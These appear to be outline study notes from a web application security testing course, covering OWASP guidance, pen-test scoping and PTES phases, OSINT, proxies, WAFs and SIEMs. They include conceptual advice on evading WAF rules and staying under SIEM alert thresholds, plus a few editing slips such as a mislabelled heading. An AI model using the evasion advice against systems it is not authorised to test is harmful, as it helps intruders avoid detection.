				□ Documenting and testing strategies for repeatability and reliability.

				□ Defining and enforcing standards for developers and testers.

				□ Change control procedures to maintain system integrity.

				□ Metrics and measurements to validate quality standards.

		○ Traditional vs. Modern View of Security

			§ Historically: Security was often reduced to login/password checks and considered separately from quality.

			§ Modern perspective: Due to advanced cyber threats, robust security must be built in as part of quality, just like usability, reliability, or efficiency.

		○ Quality Dimensions Developers Recognize

			§ Developers typically focus on: portability, reliability, testability, flexibility, efficiency, and usability.

			§ Security should be added to this list and considered an equal aspect of quality.

		○ Cultural and Team Perspective

			§ Developers may not naturally see security as part of quality, but that provides an opportunity to educate and align teams.

			§ The shared goal is to ensure apps work as intended while minimizing risk from attackers.



Positive Testing

	• Positive testing verifies that an application behaves as expected when given valid inputs. From a security standpoint, positive testing ensures that core security controls—such as authentication, authorization, password management, and session management—function correctly. Automating these tests strengthens application security and reliability.

	• Key Concepts

		○ Definition of Positive Testing

			§ Focuses on providing valid input and checking whether the actual output matches the expected output.

			§ Example: Entering a valid U.S. ZIP code (e.g., 87104) should correctly populate the corresponding city and state.

		○ Functional Positive Testing

			§ Ensures that critical application features work as intended.

			§ Example: An e-commerce app must successfully allow purchases; if not, it’s not ready for production.

			§ Functional positive tests come from requirements documents and help confirm baseline app usability.

		○ Positive Security Testing

			§ Unlike functional tests, security-related positive tests must be deliberately designed by the QA/security team. These focus on validating that security controls work as intended:

				□ Access control: Does the app require a login? Can users only access their own profile/data?

				□ Authorization: Can users only access pages, forms, and data appropriate to their role?

				□ Password management:

					® Front-end: Can users set and reset passwords properly?

					® Back-end: Are passwords stored securely as salted hashes?

				□ Session management: Are sessions established and destroyed correctly? Is traffic always encrypted in transit?

		○ Guidance \& Resources

			§ OWASP Web Security Testing Guide can provide detailed procedures and ideas for designing these security test cases.

		○ Automation

			§ Once positive security test cases are built, they can be automated.

			§ Automation ensures that with every new release/version, security controls are consistently validated.

			§ This creates a reliable baseline of core security requirements.



Negative Testing

	• Negative testing is about deliberately providing unexpected or malicious input to an application to see if it behaves incorrectly, leaks data, or becomes vulnerable to attack. It complements positive testing by preparing applications to resist real-world threats, making it an essential part of security-focused QA.

	• Key Concepts

		○ Definition of Negative Testing

			§ Sending unexpected, invalid, or malicious input to see how the app reacts.

			§ Goal: Ensure the app doesn’t do anything it’s not supposed to do.

			§ Example: Using escape characters to test for SQL injection attempts (e.g., extracting usernames or dropping tables).

		○ Difference from Positive Testing

			§ Positive testing is finite and straightforward, derived from functional requirements (what the app should do).

			§ Negative testing is broader and harder to scope, since attackers have nearly infinite input combinations and strategies (what the app shouldn’t do).

		○ Approaches to Negative Testing

			§ Start with misuse cases: scenarios where the app could be abused.

			§ Derive tests from:

				□ Security standards (internal \& external).

				□ OWASP Top 10: Each category represents a class of common attacks (e.g., injection, broken authentication, insecure deserialization).

				□ OWASP Cheat Sheet Series: 78+ guides with defensive coding practices developers should follow (from AJAX to XML).

		○ Test Case Examples

			§ SQL Injection: Attempting to extract data from a known table.

			§ Authorization bypass: Checking if restricted data can be accessed without proper permissions.

			§ Session handling abuse: Seeing if sessions persist when they shouldn’t.

		○ Automation \& Integration

			§ Automating negative test cases (especially for OWASP Top 10 vulnerabilities) helps catch issues continuously.

			§ QA processes become more robust when negative testing is part of standard practice.

		○ Developer Collaboration

			§ Negative testing not only strengthens security but also reinforces developer awareness of secure coding practices.

			§ Validating that defensive coding principles (from cheat sheets) are actually applied.

			§ When an app passes these tests, it’s both a technical and cultural win for the dev team.



SQA Metrics

	• Software Quality Assurance (SQA) metrics are essential for measuring, tracking, and improving both security and the testing process itself over time. They help identify strengths, weaknesses, gaps, and trends in software security, ultimately leading to more secure and reliable applications.

	• Key Concepts

		○ Purpose of SQA Metrics

			§ Measure how well the app performs under security testing—both now and in the future.

			§ Identify strengths, weaknesses, and gaps in testing processes.

			§ Improve efficiency by eliminating redundant tests and finding missing ones.

			§ Support continuous improvement in both software security and QA methods.

		○ Security Foundations

			§ CIA Triad (Confidentiality, Integrity, Availability):

				□ Confidentiality: Keeping secrets secret.

				□ Integrity: Preventing unauthorized changes.

				□ Availability: Ensuring systems stay online and accessible.

				□ Priority differs by organization (e.g., integrity critical for nuclear plant systems, availability critical for e-commerce).

			§ ISO/IEC 25010 Standard:

				□ Provides a comprehensive quality model for software.

				□ Since 2011, security became its own characteristic, broken into five sub-characteristics:

					® Confidentiality

					® Integrity

					® Non-repudiation (prove events occurred)

					® Accountability (assign actions to an owner)

					® Authenticity (prove identity of person/resource)

		○ Guidance Sources

			§ OWASP Developer Guide Project: Focuses on confidentiality and integrity; offers best practices for SQA metrics and processes.

			§ OWASP Application Security Metrics:

				□ Direct metrics: Within the software (e.g., lines of code, languages, security mechanisms, configs).

				□ Indirect metrics: Outside the software (e.g., documentation completeness, developer training, reporting processes).

		○ Core Metrics to Track

			§ Security bugs detected vs. security bugs remediated:

				□ Critical to monitor in every development environment.

				□ Helps security teams apply compensating controls and track whether the gap is shrinking or widening.

		○ Additional Resources

			§ NIST SAMATE (Software Assurance Metrics and Tool Evaluation):

				□ Provides frameworks, datasets, and test suites for measuring software vulnerabilities.

				□ Bugs Framework: Categorizes vulnerabilities (auth/authz issues, randomness flaws, etc.) and ties into MITRE CWE.

				□ Juliet Test Suites \& Software Assurance Reference Dataset: Thousands of test programs to help build test cases.

				□ Though not updated frequently, still highly valuable.

		



OWASP Testing Guide

	• The OWASP Web Security Testing Guide is a flagship OWASP project that serves as a comprehensive framework for structuring, conducting, and integrating security tests into QA, source code reviews, and penetration testing. It provides a structured, repeatable approach that saves time, ensures coverage, and ties test results back to business objectives.

	• Key Concepts

		○ Value of the OWASP Testing Guide

			§ Considered a cornerstone resource for web application security testing

			§ Provides ~80% of what a penetration tester or QA engineer needs to conduct thorough tests.

			§ The same tests used in penetration testing can (and should) be integrated into QA workflows.

		○ OWASP Project Categories

			§ Flagship projects: Mature, strategic, widely adopted (e.g., Testing Guide).

			§ Production projects: Production-ready but still growing.

			§ Other projects: Tools, documentation, or early-stage projects (lab, incubator, playground).

			§ The Testing Guide is flagship status, emphasizing its credibility and maturity.

		○ Key Sections of the Testing Guide

			§ Section 2.9 – Security Test Requirements

				□ Identify testing objectives first.

				□ Align activities with threat and countermeasure taxonomies.

				□ Differentiate between functional vs. risk-driven security requirements.

				□ Build use and misuse cases.

			§ Section 2.10 – Integration into Workflows

				□ Clarifies what developers should handle (unit tests) vs. what testing engineers should own (integration, functional, operational tests).

				□ Helps embed security testing naturally into the SDLC.

			§ Section 2.11 – Making Sense of Results

				□ Transform test outcomes into metrics and measurements.

				□ Track progress over time.

				□ Ensure results are linked back to business use cases to prove organizational value.

		○ Practical Use in QA

			§ The full 200+ page guide is detailed but not efficient for real-time use.

			§ Best practice: distill it into a testing checklist or spreadsheet with:

				□ Test name

				□ Test description

				□ Tools/techniques

				□ Results tracking

			§ Community has built enhanced tools (e.g., GitHub spreadsheet with risk assessment calculators and summary findings tabs).

		○ Automation \& Continuous Testing

			§ Start with manual tracking and use checklists as a requirements stock.

			§ Gradually automate tests to scale coverage and efficiency.





#### Assessing Deployed Apps



Manual vs Automated Testing

	• Effective application security testing requires a balance of manual and automated testing, informed by static analysis and aligned with organizational security maturity models. Automated tools provide speed and coverage, while manual testing delivers context, deeper insight, and business logic validation. Together, they provide a more complete security picture.

	• Key Concepts

		○ Balancing Manual and Automated Testing

			§ Automated scans are fast, repeatable, and can reveal many flaws quickly.

			§ Manual testing validates findings, eliminates false positives, and identifies complex vulnerabilities (e.g., business logic flaws, chained exploits).

			§ The best results come from combining both.

		○ Foundation in Static Testing

			§ Before running dynamic tests, review:

				□ Application documentation

				□ Security requirements

				□ Source code security reviews

				□ Results of static tests (e.g., against OWASP Top 10)

			§ This preparation helps focus dynamic tests on known risks and fine-tune tools to avoid breaking apps during scans.

		○ Dynamic Testing Tools

			§ OWASP ZAP: Automates discovery of flaws, allows tuning (exclude sensitive URLs, force-browse hidden paths).

			§ SQLMAP: Useful if static reviews reveal weaknesses in SQL injection defenses.

			§ Automated scans often include remediation advice, saving time.

		○ Manual Testing Strengths

			§ Validate automated findings (weed out false positives).

			§ Explore business logic flaws missed by scanners.

			§ Combine lower-severity issues into real-world attack chains.

			§ Provide attacker-like creativity that tools can’t replicate.

		○ No “Perfect Model”

			§ George Box’s quote: “All models are wrong, some are useful.”

			§ There’s no universal formula for the right balance between static/dynamic, manual/automated testing.

			§ The right approach depends on organizational security maturity and available resources.

		○ Maturity Models for Guidance

			§ OWASP SAMM (Software Assurance Maturity Model):

				□ Ties security practices to business functions (governance, design, implementation, verification, operations).

				□ Verification phase gives guidance on security testing.

			§ BSIMM (Building Security In Maturity Model):

				□ Domains: governance, intelligence, SDLC touchpoints, deployment.

				□ Security testing lives in the SDLC touchpoints domain.

			§ Mapping: OWASP maintains a SAMM ↔ BSIMM mapping for blended use.

		○ Iterative Improvement

			§ Any testing is better than none.

			§ Start small → prototype → iterate → improve.

			§ Discard what doesn’t work, keep refining the balance

			§ Goal: Over time, find the right mix of automation and manual effort to secure applications effectively.



Scanning vs Pen Testing

	• Automated scanning is not the same as penetration testing. Scans collect information and identify potential weaknesses, while penetration testing uses human creativity and strategy to exploit those weaknesses, uncover business logic flaws, and simulate real-world attacks. Both are important, but they serve different roles in a security testing strategy.

	• Key Concepts

		○ Scanning

			§ Definition: Automated collection of information and detection of potential vulnerabilities.

			§ Scope: Should include applications, host systems, backend databases, and network appliances.

			§ Techniques:

				□ Signature-based scanning: Detects known issues (e.g., missing patches, version numbers).

				□ Heuristic scanning (trial and error): Simulates input to discover how the app responds.

				□ Fuzzing: Sending malformed/semi-malformed data, special characters, large/negative numbers to elicit responses that could reveal flaws.

			§ Purpose: Prioritizes findings by risk but does not try to break the system.

			§ Tools:

				□ Nmap – open ports, admin services (not a vulnerability scanner).

				□ Nessus, Nexpose, Qualys – vulnerability scanners for hosts and infrastructure.

				□ OWASP ZAP, Wfuzz, Burp Suite Intruder – web app scanning and fuzzing tools.

				□ OWASP maintains curated lists of scanning tools (Appendix A of Testing Guide, community lists).

		○ Penetration Testing

			§ Definition: A human-driven process that attempts to exploit vulnerabilities to achieve specific goals.

			§ Key Differences from Scanning:

				□ Goes beyond detection—tests exploitation.

				□ Uses creativity and unconventional thinking.

				□ Targets business logic flaws and full application workflows that automated tools can’t handle.

				□ Can combine results from scanners with manual techniques.

			§ Goals:

				□ Access restricted data.

				□ Escalate privileges (e.g., compromise an admin account).

				□ Test resilience of app logic.

			§ Human Element: Pen testing leverages creativity; AI may assist in future, but humans remain essential.

		○ Relationship Between Scanning and Pen Testing

			§ Scans come first: Gather baseline information and identify likely weak points.

			§ Pen tests build on scan results: Validate and exploit vulnerabilities to measure real-world impact.

			§ Together, they provide a comprehensive security assessment.

		○ Community and Resources

			§ OWASP Web Security Testing Guide Appendix A: Specialized scanning tools list.

			§ OWASP Phoenix chapter project: Community-curated list of security testing tools.

			§ Burp Suite (PortSwigger): Popular toolset for both QA and penetration testing (advanced features require paid version).



Testing in Production

	• Security testing should be performed in a non-production environment whenever possible. This allows for unrestricted, aggressive testing without risk to live systems, helping uncover vulnerabilities before attackers exploit them in production. However, testing in non-prod requires coordination, backups, and awareness of differences between environments.

	• Key Concepts

		○ Why Test in Non-Production

			§ Non-production = “gloves off” testing: run any test, even destructive ones.

			§ Prevents slowdowns, outages, or data corruption in production.

			§ Let's you identify bugs and vulnerabilities before the app reaches end users.

			§ Criminals will run destructive tests against production—so defenders should test them safely in non-prod first.

		○ Change Control and Organizational Support

			§ Testing in non-prod ties into change control policies:

				□ Validate changes in non-prod before production deployment.

				□ Reduces risk of unplanned outages or business disruption.

			§ Including security testing in change control helps gain management buy-in for strong testing practices.

		○ Scope of Testing

			§ All tests are in scope in non-production (SQL injection, denial of service, data corruption, etc.).

			§ Be as thorough and adversarial as possible—if you skip a test, an attacker won’t.

			§ Identify vulnerabilities that will carry over to production unless addressed.

		○ Caveats and Best Practices

			§ Respect shared environments: Coordinate with other testers to avoid blocking their work.

			§ Backups are essential: Be ready to restore quickly if destructive tests damage the environment.

			§ Environment differences: Code base should match production, but infrastructure may differ—note which vulnerabilities would migrate to production.

		○ If Non-Prod Isn’t Available

			§ At minimum, use a local copy on a developer’s/tester’s machine.

			§ Skipping non-prod testing to save time or money is a false economy—short-term savings lead to long-term costs when attackers find the flaws.



Testing in Production

	• While most security testing should occur in non-production, testing in production environments is also valuable because it reveals vulnerabilities and conditions attackers could actually exploit. However, testing in production requires extreme caution, careful planning, and strict communication to avoid unintended disruption or legal/operational issues.

	• Key Concepts

		○ Why Test in Production

			§ Real-world accuracy: Production and non-production rarely match perfectly (different patch levels, configs, devices). Testing in prod eliminates inaccuracies from environment differences.

			§ Risk validation: A vulnerability critical in non-prod may be mitigated in prod by defenses (e.g., WAF blocking injection attempts).

			§ Publicly exposed data: Only production has real-world DNS records, IP addresses, and TLS certificates—attackers will use this, so defenders must test it too.

		○ Cautions \& Limitations

			§ No authenticated scans in prod: They risk unauthorized data changes or corruption (serious legal/operational consequences).

			§ Less intrusive settings: Tools should be configured to minimize impact—testing here = “kiddie gloves.”

			§ No untested tools in prod: Always vet tools first in non-prod.

		○ Planning \& Communication

			§ Communication is critical and should be overdone rather than underdone:

				□ Notify stakeholders a week before, the day before, the day of, and at the start/end of testing.

			§ First production test should run under change control procedures, ideally in an approved overnight maintenance window.

			§ A clear communication plan and change advisory board involvement ensures coordination and mitigates fallout if problems occur.

		○ Tools \& Methods

			§ Use the same tools as in non-prod, but with adjusted, less aggressive settings.

			§ Testing scope in production should focus on verifying known risks, public exposure, and defenses, not full destructive testing.

		○ Balance with Non-Prod Testing

			§ Non-prod = “gloves off,” break things to learn.

			§ Prod = “kiddie gloves,” cautious validation of real-world risks.

			§ Both are necessary: non-prod to discover flaws, prod to confirm real-world exposure and defenses.



OSINT Gathering

	• Open Source Intelligence (OSINT) gathering uses publicly available information to learn about applications, infrastructure, and organizations. Attackers leverage OSINT for stealthy reconnaissance without alerting defenders, so security teams should also perform OSINT gathering to understand and reduce their exposure.

	• Key Concepts

		○ What is OSINT

			§ Stands for Open Source Intelligence, originating from military and government use.

			§ In web application security, OSINT means collecting publicly available data attackers could use.

			§ Advantage: stealth — attackers don’t need to scan your system directly, reducing detection risk.

		○ Differences: Non-Prod vs. Prod

			§ Non-Production: Usually internal, with little/no OSINT exposure.

			§ Production: Public-facing systems must expose information (DNS entries, IP addresses, TLS certificates, login forms, password resets, etc.).

		○ Why OSINT Matters

			§ Attackers can skip noisy scans and move directly from recon to exploitation.

			§ Defenders lose the chance to stop attacks early and must react once the exploit starts.

			§ Security teams should perform OSINT on their own systems to see what attackers see.

		○ Examples of OSINT Data \& Tools

			§ TLS/SSL Certificates: Reveal key strength, algorithms, and configuration.

				□ Tools: SSL Labs (Qualys), Mozilla Observatory.

			§ DNS \& Subdomains: Identify hosts and linked services.

				□ Tools: DNSdumpster, PentestTools Subdomain Finder.

			§ Existing Search Engines: Already catalog OSINT data.

				□ Tools: Shodan (banners, OS, open ports), Censys (certificate search, admin portals).

			§ Cross-Verification: OSINT can be outdated or incomplete—use multiple sources to validate.

		○ Automation of OSINT

			§ Automating OSINT gathering improves efficiency, just like QA test automation.

			§ Tools/Resources:

				□ Trace Labs OSINT Virtual Machine (preloaded with tools).

				□ Maltego (visual link analysis).

				□ Recon-ng (framework for reconnaissance).

			§ Inspired by the older Buscador VM project.

		○ Defensive Benefits

			§ By performing OSINT internally, organizations:

				□ Understand what attackers already know.

				□ Identify overexposed information.

				□ Improve defenses (e.g., tightening TLS, removing exposed admin portals).

			§ Embedding OSINT into dynamic application security testing (DAST) provides a more complete security view.



Web App Proxies

	• Web application proxies are critical tools for security testing because they intercept and allow manipulation of traffic between a client and a web application. They enable testers to inspect, modify, and analyze requests and responses—helping to identify weaknesses that attackers could exploit.

	• Key Concepts

		○ What is a Web Application Proxy

			§ A software component that sits between the client and the server.

			§ Captures all requests and responses for inspection and manipulation.

			§ Essential in every web application security assessment.

		○ Relation to Attacks

			§ Similar to a man-in-the-middle (MITM) attack technique:

				□ Attackers may use proxies to spy on sensitive data (passwords, tokens).

				□ Can manipulate traffic (redirect, alter requests) before reaching the server.

			§ Testers use proxies ethically to validate that apps cannot be compromised in this way.

		○ Defenses Against Proxy-based Attacks

			§ Encrypt data in transit with SSL/TLS certificates.

			§ Enforce HTTP Strict Transport Security (HSTS):

				□ Forces HTTPS only.

				□ Forces HTTPS only.

		○ Types of Proxies

			§ Web Proxies: Handle HTTP/HTTPS only.

				□ Browser-based plugins (e.g., Tamper Dev for Chrome, Tamper Data for Firefox Quantum).

				□ Good for most web testing.

			§ TCP Proxies: Handle all TCP traffic, including non-web protocols.

				□ Needed for broader protocol testing.

		○ Popular Proxy Tools

			§ Burp Suite (Enterprise, Professional, Community):

				□ Includes Burp Proxy, the core feature other modules rely on.

			§ OWASP ZAP: Open-source alternative, widely used.

			§ Fiddler: Longstanding proxy tool, useful for HTTP/S traffic.

			§ Browser extensions: Tamper Dev, Tamper Data (for request/response inspection \& manipulation).

		○ Best Practices for Security Testing with Proxies

			§ Use proxies to inspect and manipulate traffic to simulate potential attacks.

			§ Integrate proxies into dynamic application security testing (DAST) workflows.

			§ Experiment with different tools, then adopt the one(s) best suited for your testing needs.



DevSecOps

	• DevSecOps integrates security into the fast-paced DevOps model, ensuring security is embedded into CI/CD pipelines without disrupting development. Security must evolve alongside development and operations, using automation, collaboration, and OWASP guidance to reduce business risk while keeping up with rapid release cycles.

	• Key Concepts

		○ Shift in Development Models

			§ Traditional: monolithic software with updates a few times a year.

			§ Modern: agile/DevOps with updates multiple times per week.

			§ Ops and security had to adapt to faster release cycles.

		○ DevOps vs. DevSecOps

			§ DevOps: Dev + Ops share tools and practices to improve speed and efficiency.

			§ DevSecOps: Security is embedded, not siloed.

				□ Blends business acumen + technical security knowledge.

				□ Goal: risk reduction to minimize business disruptions.

			§ Without security in the pipeline, incident risk rises significantly.

		○ CI/CD Pipeline

			§ Core of DevOps, often represented by an infinity loop (continuous flow, no start or end).

			§ CI = Continuous Integration, CD = Continuous Delivery/Deployment.

			§ Non-linear, always moving—security must integrate seamlessly.

		○ Challenge for Security Professionals

			§ Security often wasn’t included when DevOps pipelines were first built.

			§ Task: find ways to integrate security without disrupting workflow.

			§ Forcing intrusive security measures can lead to resistance and failure.

		○ OWASP DevSecOps Guidelines

			§ Security practices/tools to insert into pipelines:

				□ Secret scanning – detect hardcoded credentials.

				□ Software Composition Analysis (SCA) – find vulnerabilities in third-party libraries.

				□ Static Application Security Testing (SAST) – analyze source code.

				□ Infrastructure-as-Code (IaC) scanning – check cloud deployments.

				□ Container scanning – test containerized apps for weaknesses.

				□ Dynamic Application Security Testing (DAST) – analyze running apps (this course’s focus).

				□ Infrastructure scanning – test supporting systems/components.

				□ Compliance checks – ensure alignment with internal/external requirements.

		○ Cloud-Native Pipelines

			§ CI/CD pipeline tools from major cloud providers:

				□ AWS CodePipeline

				□ Azure Pipelines

				□ Google Cloud Build

			§ Security should integrate into these native pipelines.

		○ Best Practices for Implementation

			§ Embrace DevSecOps as a mindset, not just a toolset.

			§ Educate dev/ops teams on where and how security fits.

			§ Meet teams where they are: integrate into their workflows rather than disrupting them.

			§ Look for opportunities to automate security testing within existing pipelines.





#### Web App Pen Testing



Scoping a Web App Pen Test

	• Scoping a web application penetration test is critical to ensure that testing is goal-driven, clearly defined, and aligned with business, technical, and legal constraints. Proper scoping prevents wasted effort, reduces risk of disruption, and ensures compliance with hosting providers’ rules of engagement.

	• Key Concepts

		○ Define the Goal

			§ The end goal drives the scope:

				□ Data-centric: Access restricted/sensitive data (e.g., PCI DSS, HIPAA requirements).

				□ Account-centric: Gain access to another user’s or admin’s account and test potential damage.

			§ Clarifying the test’s objective ensures focus on the right assets.

		○ Define What’s In and Out of Scope

			§ URLs / Applications: Confirm exact apps, subdomains, or subdirectories in-scope.

			§ Exclusions: Identify pages that should not be tested (e.g., admin or password reset).

			§ IP addresses / Net blocks: Apps may be accessible directly via IP addresses (sometimes forgotten or decommissioned systems).

			§ User accounts: Determine if valid test accounts will be provided and whether certain user/admin accounts are off-limits.

		○ Timing Considerations

			§ Testing can impact availability or performance. Minimize risk by:

				□ Avoiding peak business times (e.g., e-commerce during holidays).

				□ Respecting industry-specific blackout periods (e.g., code freezes).

				□ Testing during maintenance/change windows where possible.

			§ Coordinate with ops and security teams to avoid false alarms from alerts.

		○ Non-Production Testing

			§ Use non-production environments for high-risk exploits.

			§ Proving an exploit in non-prod + reviewing change controls may be enough to validate production exposure, reducing business risk.

		○ Documentation

			§ Never assume. Get scoping details in writing to avoid misunderstandings.

			§ Clearly define: in-scope systems, exclusions, accounts, time frames, and change-control approvals.

		○ Cloud Hosting Provider Requirements

			§ Each provider has its own penetration testing rules:

				□ AWS: Explicit policies outlining what’s allowed.

				□ Azure: No prior notification needed, but must comply with unified rules of engagement.

				□ Google Cloud: No notification needed, but must follow acceptable use policy \& ToS.

			§ Other providers: always check before testing.



Avoiding Production Impacts

	• Penetration testing in production must be carefully managed to avoid disrupting live systems. Poorly scoped or miscommunicated tests can cause serious operational, legal, and reputational issues. By properly engaging stakeholders, documenting scope, and testing in non-production first, testers can minimize risks while still achieving valuable security insights.

	• Key Concepts

		○ Risks of Testing in Production

			§ Pen tests can accidentally cause:

				□ Slowdowns or outages.

				□ Corrupted databases.

				□ Business-critical failures.

			§ Mistakes can create organizational fallout (e.g., legal, HR, diversity issues in the shared story).

			§ Over-testing = higher risk but more comprehensive results.

			§ Under-testing = less risk but leaves blind spots, creating a false sense of security.

		○ Scoping Trade-Offs

			§ Inclusive scope → thorough test, more findings, but higher chance of breaking production.

			§ Restricted scope → safer and faster, but may miss real risks.

			§ Pen test scoping is always a balancing act.

		○ Five-Step Process to Reduce Production Impacts

			§ Communicate with stakeholders

				□ Meet with all stakeholders (IT, HR, legal, business leaders).

				□ Be transparent about tools, methods, risks, and benefits.

			§ Document risks and conversations

				□ Capture agreements and concerns in the project plan or statement of work.

				□ Clarify the link between scope restrictions and the accuracy of findings.

			§ Call out exclusions explicitly

				□ If forms, accounts, or endpoints are excluded, note they won’t be tested.

				□ Highlight that excluded elements may still represent common attack vectors (e.g., SQL injection).

			§ Review and approve the plan

				□ Go over documentation with stakeholders before starting.

				□ Get explicit approval of what is and isn’t in scope.

			§ Test first in non-production

				□ Run tools against non-prod to gauge impact.

				□ Adjust settings or methods before applying to production.

		○ Lessons Learned

			§ Miscommunication can cause major reputational damage, even if no real harm was intended.

			§ Over-communicate, document everything, and gain approval before testing.

			§ Experience and preparation separate reckless testing from professional security assessments.



Penetration Testing Execution

	• The Penetration Testing Execution Standard (PTES) provides a structured, seven-phase framework for conducting penetration tests—from scoping to reporting. By following PTES, testers leverage best practices developed by industry experts, ensuring tests are thorough, realistic, and aligned with business needs.

	• Key Concepts

		○ PTES as a Framework

			§ Provides expert guidance covering the full penetration testing lifecycle.

			§ Organized into seven phases, visualized as a funnel: broad early activities (info gathering) → narrower, focused later stages (exploitation, reporting).

			§ Helps testers avoid wasted effort and deliver comprehensive, business-relevant results.

		○ Seven Phases of PTES

			§ Pre-Engagement Interactions

				□ Define scope (in-scope vs. out-of-scope systems, URLs, accounts).

				□ Establish rules of engagement: timelines, procedures if detected/blocked.

				□ Communicate with third parties (MSSPs, hosting providers).

				□ Update communication plan (contacts, notification process).

			§ Intelligence Gathering

				□ Collect as much information as possible about the target app/infrastructure.

				□ Balance active (direct scanning) vs. passive (stealthy OSINT) methods.

				□ Use OSINT \& foot printing (DNS, TLS certs, Shodan, etc.).

				□ PTES defines three levels of information gathering to avoid “rabbit holes.”

			§ Threat Modeling

				□ Identify real-world threat actors and emulate their methods.

				□ Analyze business assets \& processes tied to the app.

				□ Incorporate models like STRIDE (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege) or DREAD (Damage, Reproducibility, Exploitability, Affected Users, Discoverability).

			§ Vulnerability Analysis

				□ Use vulnerability scanners (e.g., Burp Suite, OWASP ZAP).

				□ Include APIs \& web services in testing (not just user-facing apps).

				□ Perform both active scans and research (e.g., CVE databases).

				□ Identify and prioritize exploitable weaknesses.

			§ Exploitation

				□ Attempt to exploit identified vulnerabilities.

				□ Plan for countermeasures (e.g., WAF, SOC detection).

				□ Distinguish false positives from real exploitable issues.

				□ Goal: prove the actual risk by compromising the application.

			§ Post-Exploitation

				□ Four key activities:

					® Persistence (maintain access, e.g., backdoors).

					® Privilege Escalation \& Lateral Movement (expand control).

					® Data Exfiltration (extract sensitive/restricted data).

					® Cleanup (remove artifacts/backdoors).

				□ Simulates what real attackers would do after the initial exploit.

			§ Reporting

				□ Most important phase: translate technical results into actionable findings.

				□ Executive Summary: non-technical, focused on business impact.

				□ Technical Details: tools used, techniques, step-by-step explanations.

				□ Goal: readers should be able to replicate tests and trust remediation recommendations.



Types of Pen Tests

	• There are three main types of penetration tests—black box, gray box, and white box—and each offers different perspectives and trade-offs. Organizations should aim to use all three over time to gain a complete picture of their application’s security posture, influenced by factors like time, resources, and testing goals.

	• Key Concepts

		○ Black Box Testing

			§ Tester = outsider with no prior knowledge of the application or controls.

			§ Simulates a real-world attacker’s perspective.

			§ Strength: most realistic external view.

			§ Weakness: may overlook vulnerabilities because the tester doesn’t have insider context.

		○ White Box Testing

			§ Tester is given full internal knowledge: reports, diagrams, scan results, valid credentials.

			§ Goal: maximize tester’s time by focusing directly on the most relevant controls.

			§ Strength: highly thorough, efficient at uncovering flaws.

			§ Weakness: less realistic in simulating a true external attacker’s view.

		○ Gray Box Testing

			§ Middle ground: tester is given some insider knowledge, but not everything.

			§ Balances outsider realism with insider efficiency.

			§ Most common approach in practice.

			§ The amount of info is usually negotiated during pre-engagement.

		○ Factors Influencing Test Type

			§ Time \& Cost: Pen tests range from days to weeks; budget and time constraints shape scope.

			§ Tester Role: Internal red teams can spend more time and conduct repeated tests; external consultants may be time-limited.

			§ Goal of the Test:

				□ Compliance-driven orgs may settle for black/gray box.

				□ Security-mature orgs often combine all three for ongoing assurance.

		○ Recommended Approach

			§ Do all three types at least once to get a well-rounded view.

				□ Start with black box → attacker’s perspective.

				□ Move to gray box → partial insider view.

				□ Establish recurring white box tests → ongoing validation with full knowledge.

			§ Use findings from previous tests to inform scoping and pre-engagement for the next round.



Web Application Firewalls

	• Web Application Firewalls (WAFs) are security tools that filter and inspect HTTP/HTTPS traffic to block malicious requests (like SQL injection and XSS). As an application security tester, you need to understand how WAFs work, how to deploy/tune them effectively, and how attackers may try to evade them.

	• Key Concepts

		○ What a WAF Is

			§ Defensive technology for web traffic, different from a network firewall.

			§ Inspects HTTP/HTTPS payloads instead of just ports/IPs.

			§ Detects malicious patterns (SQLi, XSS) while allowing legitimate traffic.

		○ Benefits

			§ Can virtually patch applications—defend against known exploits while developers work on permanent fixes.

			§ Supports custom rules tailored to an app’s traffic.

		○ Open Source WAF Options

			§ ModSecurity (most popular; Apache module, now broader).

				□ OWASP maintains the ModSecurity Core Rule Set (CRS).

			§ NAXSI (Nginx Anti-XSS \& SQLi).

			§ WebKnight (for IIS).

			§ Shadow Daemon.

			§ OWASP Coraza.

		○ Deployment Best Practices

			§ Start in listen-only mode (monitoring, not blocking).

			§ Collect baseline data on legitimate traffic.

			§ Enable alerts gradually (e.g., for OWASP Top 10 attacks).

			§ Test with vulnerability scans and pen tests before enabling blocking.

			§ Roll out rules incrementally to avoid false positives disrupting production.

		○ Evasion \& Testing

			§ Identifying WAF type:

				□ Look for cookies, HTTP header values, error messages.

				□ Tools: nmap --script http-waf-detect, Wafw00f (Kali Linux).

			§ Evasion techniques:

				□ Manipulate request characters to bypass detection.

				□ White-box pen test: review rule sets, craft payloads that “slip through.”

				□ Tools: WAFNinja (GitHub project).



Security Information and Event Management Program (SIEMs)

	• Security Information and Event Management (SIEM) systems combine log management and incident response automation to detect, correlate, and alert on potential attacks. As a penetration tester, you must understand how SIEMs work, how they’re deployed, and how to avoid triggering alerts during testing.

	• Key Concepts

		○ What a SIEM Is

			§ Combination of two technologies:

				□ SIM (Security Information Management): collects/analyzes logs, extracts events, automates log management.

				□ SEM (Security Event Management): performs real-time threat analysis and incident response automation.

			§ Together: provide centralized log management + incident detection/response.

		○ Core Capabilities

			§ Log aggregation: Collect logs from disparate systems in one searchable interface.

			§ Correlation: Identify relationships/patterns that suggest malicious activity.

			§ Analysis: Allow manual inspection and advanced pattern hunting.

			§ Alerting: Near real-time alerts on suspicious behavior.

		○ Open Source \& Popular SIEM Tools

			§ ELK Stack (Elasticsearch, Logstash, Kibana) – most popular open-source option.

			§ OSSEC+ – host-based IDS usable as SIEM with configuration.

			§ OSSIM (AlienVault) – open-source SIEM, lightweight version of commercial offering.

			§ Snort – IDS/IPS at network level, sometimes used in SIEM setups.

			§ Splunk – commercial, but very popular (free version has data limits).

		○ Cloud-Native SIEMs

			§ AWS: Control Tower.

			§ Azure: Microsoft Sentinel.

			§ Google: Chronicle.

			§ Adoption depends heavily on budget, since cloud services are pay-as-you-go.

		○ Best Practices for SIEM Deployment

			§ Feed logs from all infrastructure components:

				□ Application logs

				□ Web server logs (Apache, IIS)

				□ NetFlow logs

				□ Host OS logs

				□ Database logs

				□ WAF logs

			§ More logs = better detection \& correlation.

			§ Without proper logs, SIEM cannot function effectively.

		○ Pen Testing \& Evasion Strategies

			§ OSINT (Open-Source Intelligence): Safe, since it doesn’t touch monitored systems.

			§ Attack style: Use “low and slow” instead of brute force.

			§ Threshold evasion: SIEMs tune out “noise” by setting thresholds (e.g., 1 failed login/minute = normal; 60/minute = attack). Stay under those thresholds to avoid alerts.

			§ SIEM is not internet-facing → won’t be directly visible in pen tests.



Purple Teaming

